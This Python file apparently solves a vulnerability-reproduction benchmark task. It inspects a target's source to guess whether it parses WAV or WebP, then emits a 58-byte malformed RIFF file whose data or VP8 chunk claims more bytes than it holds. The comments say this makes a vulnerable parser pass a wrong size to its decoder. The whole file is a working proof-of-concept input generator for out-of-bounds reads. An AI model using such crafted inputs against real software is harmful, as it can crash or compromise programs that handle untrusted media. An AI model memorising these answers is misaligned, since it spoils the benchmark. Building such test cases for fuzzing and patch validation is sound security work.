import os
import io
import tarfile
import struct
from typing import Iterator, Tuple, Optional


class Solution:
    def _iter_files_from_dir(self, root: str) -> Iterator[Tuple[str, bytes]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not os.path.isfile(path):
                    continue
                if st.st_size <= 0 or st.st_size > 256 * 1024:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read(256 * 1024 + 1)
                except OSError:
                    continue
                yield os.path.relpath(path, root), data

    def _iter_files_from_tar(self, tar_path: str) -> Iterator[Tuple[str, bytes]]:
        try:
            with tarfile.open(tar_path, mode="r:*") as tf:
                count = 0
                for m in tf:
                    if count >= 2500:
                        break
                    count += 1
                    if not m.isfile() or m.size <= 0 or m.size > 256 * 1024:
                        continue
                    name = m.name
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(256 * 1024 + 1)
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            return

    def _detect_riff_flavor(self, src_path: str) -> str:
        score_webp = 0
        score_wav = 0

        def score_name(name_l: str) -> None:
            nonlocal score_webp, score_wav
            if "webp" in name_l or "vp8" in name_l or "vp8l" in name_l or "vp8x" in name_l:
                score_webp += 2
            if "wav" in name_l or "wave" in name_l:
                score_wav += 2
            if "riff" in name_l:
                score_wav += 1

        def score_content(data: bytes) -> None:
            nonlocal score_webp, score_wav
            up = data.upper()
            if b"WEBP" in up or b"VP8 " in up or b"VP8L" in up or b"VP8X" in up or b"WEBPDECODE" in up:
                score_webp += 8
            if b"WAVE" in up or b"FMT " in up or b"'WAVE'" in up or b"\"WAVE\"" in up:
                score_wav += 8
            if b"LLVMFUZZERTESTONEINPUT" in up:
                if b"WEBP" in up or b"VP8" in up:
                    score_webp += 12
                if b"WAVE" in up or b"FMT " in up:
                    score_wav += 12
            if b"RIFF" in up:
                score_wav += 2

        if os.path.isdir(src_path):
            for name, data in self._iter_files_from_dir(src_path):
                name_l = name.lower()
                score_name(name_l)
                score_content(data)
        else:
            # quick name-based scoring from tar listing, then sample contents
            try:
                with tarfile.open(src_path, mode="r:*") as tf:
                    members = tf.getmembers()
                for m in members[:5000]:
                    score_name(m.name.lower())
            except Exception:
                pass
            for name, data in self._iter_files_from_tar(src_path):
                score_name(name.lower())
                score_content(data)

        return "webp" if score_webp > score_wav else "wav"

    def _poc_wav(self) -> bytes:
        # 58 bytes total
        # RIFF size correct (file_len - 8), but data chunk claims 32 bytes while only 14 provided.
        data_bytes = b"\x00" * 14
        file_len = 12 + (8 + 16) + (8 + len(data_bytes))
        riff_size = file_len - 8  # 50

        fmt_size = 16
        audio_format = 1  # PCM
        num_channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        block_align = num_channels * (bits_per_sample // 8)
        byte_rate = sample_rate * block_align

        claimed_data_size = 32  # exceeds available data and RIFF chunk end

        out = io.BytesIO()
        out.write(b"RIFF")
        out.write(struct.pack("<I", riff_size))
        out.write(b"WAVE")

        out.write(b"fmt ")
        out.write(struct.pack("<I", fmt_size))
        out.write(struct.pack("<HHIIHH", audio_format, num_channels, sample_rate, byte_rate, block_align, bits_per_sample))

        out.write(b"data")
        out.write(struct.pack("<I", claimed_data_size))
        out.write(data_bytes)

        bts = out.getvalue()
        if len(bts) != 58:
            # enforce exact length deterministically
            if len(bts) < 58:
                bts += b"\x00" * (58 - len(bts))
            else:
                bts = bts[:58]
        return bts

    def _poc_webp(self) -> bytes:
        # 58 bytes total:
        # RIFF size correct, but VP8 chunk size claims more than available; vulnerable parser passes wrong size to decoder.
        payload_len = 38
        claimed_chunk_size = 96  # larger than payload_len
        # VP8 frame tag with partition_length=60, show_frame=1, keyframe=0
        # value = 0x10 | (60 << 5) = 0x790 => LE 0x90 0x07 0x00
        frame_tag = b"\x90\x07\x00"
        start_code = b"\x9d\x01\x2a"
        width_height = b"\x01\x00\x01\x00"  # 1x1
        header = frame_tag + start_code + width_height  # 10 bytes
        payload = header + (b"\x00" * (payload_len - len(header)))

        file_len = 12 + 8 + payload_len  # RIFF+size+WEBP + chunk header + payload = 58
        riff_size = file_len - 8  # 50

        out = io.BytesIO()
        out.write(b"RIFF")
        out.write(struct.pack("<I", riff_size))
        out.write(b"WEBP")
        out.write(b"VP8 ")
        out.write(struct.pack("<I", claimed_chunk_size))
        out.write(payload)

        bts = out.getvalue()
        if len(bts) != 58:
            if len(bts) < 58:
                bts += b"\x00" * (58 - len(bts))
            else:
                bts = bts[:58]
        return bts

    def solve(self, src_path: str) -> bytes:
        flavor = self._detect_riff_flavor(src_path)
        if flavor == "webp":
            return self._poc_webp()
        return self._poc_wav()